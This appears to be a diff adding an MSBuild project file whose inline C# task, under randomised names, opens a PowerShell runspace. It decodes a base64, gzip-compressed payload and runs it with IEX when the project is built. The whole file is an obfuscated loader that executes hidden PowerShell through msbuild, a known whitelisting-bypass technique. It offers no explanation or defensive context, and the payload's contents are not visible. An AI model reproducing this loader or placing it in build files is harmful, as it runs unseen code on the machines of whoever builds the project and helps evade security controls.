@@ -1,0 +1,42 @@
+﻿<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+ <!-- Author: Pierre-Alexandre Braeken, Twitter: @pabraeken -->
+  <Target Name="34rfas">
+   <QWEridxnaPO/>
+  </Target>
+	<UsingTask
+    TaskName="QWEridxnaPO"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	<Task>
+	  <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[		
+			using System;
+			using System.IO;
+			using System.Diagnostics;
+			using System.Reflection;
+			using System.Runtime.InteropServices;
+			using System.Collections.ObjectModel;
+			using System.Management.Automation;
+			using System.Management.Automation.Runspaces;
+			using System.Text;
+			using Microsoft.Build.Framework;
+			using Microsoft.Build.Utilities;							
+			public class QWEridxnaPO :  Task, ITask {
+				public override bool Execute() {
+					string pok = "$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAAAAAAACg3KsRKDIAwA0F9xUwfguvYPutite4CcxMPEI1Hs37dvfoT3MC3Y3TtumGxY0HzHmCoh2+yzdK4CWa0Rr9NYzA59htCg+5WsnPFUbEnY/t0n2UMs0CB32L6ggfgCJeGwgxq28OLLVan+0Mc4D+6DLYriDzAiUOSEAAAA'));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();";
+					Runspace runspace = RunspaceFactory.CreateRunspace();
+					runspace.Open();
+					RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
+					Pipeline pipeline = runspace.CreatePipeline();
+					pipeline.Commands.AddScript(pok);
+					pipeline.Invoke();
+					runspace.Close();			
+					return true;
+				}								 
+			}			
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
